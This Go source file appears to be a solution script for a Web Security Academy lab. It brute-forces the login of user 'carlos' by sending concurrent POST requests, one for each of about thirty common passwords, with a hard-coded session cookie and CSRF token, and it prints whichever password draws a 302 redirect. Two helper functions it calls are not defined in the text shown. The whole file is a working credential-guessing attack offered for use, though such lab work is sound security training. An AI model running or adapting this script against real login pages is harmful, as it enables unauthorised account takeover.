package main

import (
	"fmt"
	"net/http"
	"sync"
)

var passwords = [...]string{
	"123123",
	"abc123",
	"football",
	"monkey",
	"letmein",
	"shadow",
	"master",
	"666666",
	"qwertyuiop",
	"123321",
	"mustang",
	"123456",
	"password",
	"12345678",
	"qwerty",
	"123456789",
	"12345",
	"1234",
	"111111",
	"1234567",
	"dragon",
	"1234567890",
	"michael",
	"x654321",
	"superman",
	"1qaz2wsx",
	"baseball",
	"7777777",
	"121212",
	"000000",
}

var (
	goRoutines = len(passwords)

	mainUrl       = "https://0a3d005e03a315e982a77f9b001b0015.web-security-academy.net" // should NOT end with "/"
	sessionCookie = "session=gW1zI3ZSOrZ2qyhnC54e2JwXSMNXZSjx"

	http_client = http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
)

func main() {
	var wg sync.WaitGroup

	for i := 0; i < goRoutines; i++ {
		wg.Add(1)
		go flow(&wg, passwords[i])
	}

	wg.Wait()
}

func flow(wg *sync.WaitGroup, pass string) {
	defer wg.Done()

	resp := makeHttpReq(http.MethodPost, mainUrl+"/login", "csrf=8kILkgbXFHClNjipnXaURxYnoiVHGmlT&username=carlos&password="+pass, true)
	defer resp.Body.Close()

	if resp.StatusCode == 302 {
		fmt.Println("********")
		fmt.Println("********")
		fmt.Println(pass)
		fmt.Println("********")
		fmt.Println("********")
		rawHttpLikeOutput(resp)
	}
}
